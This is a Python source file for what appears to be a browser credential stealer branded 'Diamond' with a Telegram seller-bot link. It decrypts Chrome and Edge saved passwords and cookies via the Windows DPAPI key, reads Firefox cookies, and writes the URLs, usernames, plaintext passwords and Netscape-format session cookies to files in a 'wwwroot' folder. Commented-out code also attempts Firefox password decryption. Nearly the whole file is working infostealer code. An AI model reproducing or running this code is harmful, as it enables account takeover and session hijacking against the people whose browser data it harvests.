from genericpath import isfile
import os
import glob
import subprocess
import sys
import base64
from base64 import b64decode
import json
import datetime
import sqlite3

try:
    import requests
except:
    print("installing requests")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
try:
    from Crypto.Cipher import AES
except:
    print("installing pycryptodome")
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', 'pycryptodome'])
try:
    import win32crypt
except:
    print("installing pywin32")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
try:
    import pycryptodomex
except:
    print("installing pycryptodomex")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pycryptodomex'])


def edge_fetching_encryption_key():
    local_computer_directory_path = os.path.join(os.getcwd(), 'wwwroot', 'Local State')

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def chrome_fetching_encryption_key():
    local_computer_directory_path = os.path.join(os.getcwd(), 'wwwroot', 'Local State')

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

# def firefox_fetching_ecnryption_key():
#     key_db_path = r"C:\Users\Agent\AppData\Roaming\Mozilla\Firefox\Profiles\xf2t0738.default-release\key4.db"
#     logins_json_path = r"C:\Users\Agent\AppData\Roaming\Mozilla\Firefox\Profiles\xf2t0738.default-release\logins.json"
#     password_db = os.path.join(key_db_path, 'logins.json')
#     conn = sqlite3.connect(key_db_path)
#     cursor = conn.cursor()

# # Retrieve the encrypted password data
#     cursor.execute("SELECT encryptedUsername, encryptedPassword FROM moz_logins")
#     rows = cursor.fetchall()

# # Firefox decryption key
# # Change this value according to your Firefox version
# # The key may be different on different operating systems and Firefox versions
#     key = "8b9c230fcf93061f14db7c3b5268f49df8132c36964e2fda6e9aa6787655e4e5".decode('hex')

# # Decrypt and print the passwords
#     for row in rows:
#         encrypted_username = row[0]
#         encrypted_password = row[1]

#     # Decrypt username
#         username_cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_username[:16])
#         username = username_cipher.decrypt_and_verify(encrypted_username[16:], encrypted_username[16:32])

#     # Decrypt password
#         password_cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_password[:16])
#         password = password_cipher.decrypt_and_verify(encrypted_password[16:], encrypted_password[16:32])

#         print("Username: {}".format(username.decode('utf-8')))
#         print("Password: {}".format(password.decode('utf-8')))
#         print("")

# # Close the database connection
#     conn.close()


# PASSWORD DECRYPTION
def edge_password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        # send("unencripted data : "+str(iv))

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
        
def chrome_password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        # send("unencripted data : "+str(iv))

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
        

# GET THE COOKIES FROM EGDE 
edgeKey = edge_fetching_encryption_key()
def get_edge_netscape_cookies():
    edge_cookie_path = os.path.join(os.getcwd(), 'wwwroot', 'Cookies')

    if not os.path.isfile(edge_cookie_path):
        return 'Path is not found'
    import sqlite3
    conn = sqlite3.connect(edge_cookie_path)
    c = conn.cursor()
    c.execute("SELECT host_key, is_secure, path, expires_utc, name, value, encrypted_value, creation_utc FROM cookies")
    cookies = c.fetchall()
    netscape_cookies = []

    for cookie in cookies:
        domain = cookie[0]
        flag = str(bool(cookie[1])).upper()
        path = cookie[2]
        # expiration = get_timestamp(cookie[6])
        expiration = cookie[3]
        name = cookie[4]
        # value = cookie[5]
        encrypted_value = edge_password_decryption(cookie[6], edgeKey)

        netscape_cookie = f"{domain}\t{flag}\t{path}\tFALSE\t{expiration}\t{name}\t{encrypted_value}"
        netscape_cookies.append(netscape_cookie)        
    conn.close()
    return '\n'.join(netscape_cookies)

# GET THE COOKIES FROM CHROME
chromeKey = chrome_fetching_encryption_key()
def get_chrome_netscape_cookies():
    chrome_cookie_path = os.path.join(os.getcwd(), 'wwwroot', 'Cookies')

    if not os.path.isfile(chrome_cookie_path):
        return 'Path not found'
    import sqlite3

    conn = sqlite3.connect(chrome_cookie_path)
    c = conn.cursor()

    c.execute("SELECT host_key, is_secure, path, expires_utc, name, value, encrypted_value, creation_utc FROM cookies")
    cookies = c.fetchall()

    netscape_cookies = []
    for cookie in cookies:
        domain = cookie[0]
        flag = str(bool(cookie[1])).upper()
        path = cookie[2]
        # secure = str(bool(cookie[3])).upper()
        expiration = cookie[3]
        name = cookie[4]
        # value = cookie[5]
        encrypted_value = chrome_password_decryption(cookie[6], chromeKey)

        netscape_cookie = f"{domain}\t{flag}\t{path}\tFALSE\t{expiration}\t{name}\t{encrypted_value}"
        netscape_cookies.append(netscape_cookie)

    conn.close()

    return '\n'.join(netscape_cookies)

# GET THE COOKIES FROM FIREFOX
def get_firefox_netscape_cookies():
    firefox_cookie_path = os.path.join(os.getcwd(), 'wwwroot', 'cookies.sqlite')

    if not os.path.isfile(firefox_cookie_path):
        return 'Path not found'
    import sqlite3

    conn = sqlite3.connect(firefox_cookie_path)
    c = conn.cursor()

    c.execute("SELECT host, isSecure, path, expiry, name, value FROM moz_cookies")
    cookies = c.fetchall()

    netscape_cookies = []
    for cookie in cookies:
        domain = cookie[0]
        flag = str(bool(cookie[1])).upper()
        path = cookie[2]
        # secure = str(bool(cookie[3])).upper()
        expiration = cookie[3]
        name = cookie[4]
        value = cookie[5]
        # encrypted_value = chrome_password_decryption(cookie[6], chromeKey)

        netscape_cookie = f"{domain}\t{flag}\t{path}\tFALSE\t{expiration}\t{name}\t{value}"
        netscape_cookies.append(netscape_cookie)

    conn.close()

    return '\n'.join(netscape_cookies)



# DECRYPT THE EDGE PASSWORDS
def decrypt_edge_passwords():
    accountInfo = []
    key = edge_fetching_encryption_key()
    db_path = os.path.join(os.getcwd(), 'wwwroot', 'Login Data')
    # filename = "ChromePasswords.db"
    # shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = edge_password_decryption(row[3], key)
        # date_of_creation = row[4]
        # last_usuage = row[5]

        

        if user_name or decrypted_password:

            mainURL = f"Main URL: {main_url}"
            loginURL = f"Login URL: {login_page_url}"
            userName = f"Username: {user_name}"
            password = f"Password: {decrypted_password}\n"

            accountInfo.append(mainURL)
            accountInfo.append(loginURL)
            accountInfo.append(userName)
            accountInfo.append(password)

        else:
            continue

    cursor.close()
    db.close()

    return '\n'.join(accountInfo)

# DECRYPT THE CHROME PASSWORDS
def decrypt_chrome_passwords():
    accountInfo = []
    key = chrome_fetching_encryption_key()
    db_path = os.path.join(os.getcwd(), 'wwwroot', 'Login Data')
    # filename = "ChromePasswords.db"
    # shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = chrome_password_decryption(row[3], key)
        # date_of_creation = row[4]
        # last_usuage = row[5]

        

        if user_name or decrypted_password:

            mainURL = f"Main URL: {main_url}"
            loginURL = f"Login URL: {login_page_url}"
            userName = f"Username: {user_name}"
            password = f"Password: {decrypted_password}\n"

            accountInfo.append(mainURL)
            accountInfo.append(loginURL)
            accountInfo.append(userName)
            accountInfo.append(password)

        else:
            continue

    cursor.close()
    db.close()

    return '\n'.join(accountInfo)

# DECRYPT THE FIREFOX PASSWORDS
# def decrypt_firefox_passwords():
#     accountInfo = []
#     # key = chrome_fetching_encryption_key()
#     db_path = os.path.join(os.getcwd(), 'firefox', 'pass')
#     # filename = "ChromePasswords.db"
#     # shutil.copyfile(db_path, filename)

#     # connecting to the database
#     db = sqlite3.connect(db_path)
#     cursor = db.cursor()

#     # 'logins' table has the data
#     cursor.execute(
#         "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
#         "order by date_last_used")

#     # iterate over all rows
#     for row in cursor.fetchall():
#         main_url = row[0]
#         login_page_url = row[1]
#         user_name = row[2]
# #         decrypted_password = chrome_password_decryption(row[3], key)
# #         # date_of_creation = row[4]
# #         # last_usuage = row[5]

        

#         if user_name or decrypted_password:

#             mainURL = f"Main URL: {main_url}"
#             loginURL = f"Login URL: {login_page_url}"
#             userName = f"Username: {user_name}"
#             password = f"Password: {decrypted_password}\n"

#             accountInfo.append(mainURL)
#             accountInfo.append(loginURL)
#             accountInfo.append(userName)
#             accountInfo.append(password)

#         else:
#             continue

#     cursor.close()
#     db.close()

#     return '\n'.join(accountInfo)

# MAIN METHOD
def main():
    botLogo = "  _____  _                                 _ \n" \
            " |  __ \(_)                               | |\n" \
            " | |  | |_  __ _ _ __ ___   ___  _ __   __| |\n" \
            " | |  | | |/ _` | '_ ` _ \ / _ \| '_ \ / _` |\n" \
            " | |__| | | (_| | | | | | | (_) | | | | (_| |\n" \
            " |_____/|_|\__,_|_| |_| |_|\___/|_| |_|\__,_|\n\n" \
            "--> - https://t.me/sellerofdiamond_bot - <--\n\n"
    
    # edge_cookies = get_edge_netscape_cookies()
    chrome_cookies = get_chrome_netscape_cookies()
    # firefox_cookies = get_firefox_netscape_cookies()

    # DECRYPT THE PASSWORDS
    # edge_passwords = decrypt_edge_passwords()
    chrome_passwords = decrypt_chrome_passwords()
    
    # Save Netscape format cookies to a file
    with open(os.path.join(os.getcwd(), 'wwwroot', 'chromeCookies.txt'), 'w') as file:
        file.write(chrome_cookies)
    # with open(os.path.join(os.getcwd(), 'wwwroot', 'EdgeBrowser.txt'), 'w') as file:
    #     file.write(edge_cookies)
    # with open(os.path.join(os.getcwd(), 'wwwroot', 'ChromeBrowser.txt'), 'w') as file:
    #     file.write(chrome_cookies)
    # with open(os.path.join(os.getcwd(), 'wwwroot', 'FirefoxBrowser.txt'), 'w') as file:
    #     file.write(firefox_cookies)

    # SAVE THE PASSWORDS
    with open(os.path.join(os.getcwd(), 'wwwroot', 'chromePasswords.txt'), "w") as file:
        file.write(botLogo + chrome_passwords)

if __name__ == "__main__":
    main()
    print("Success")
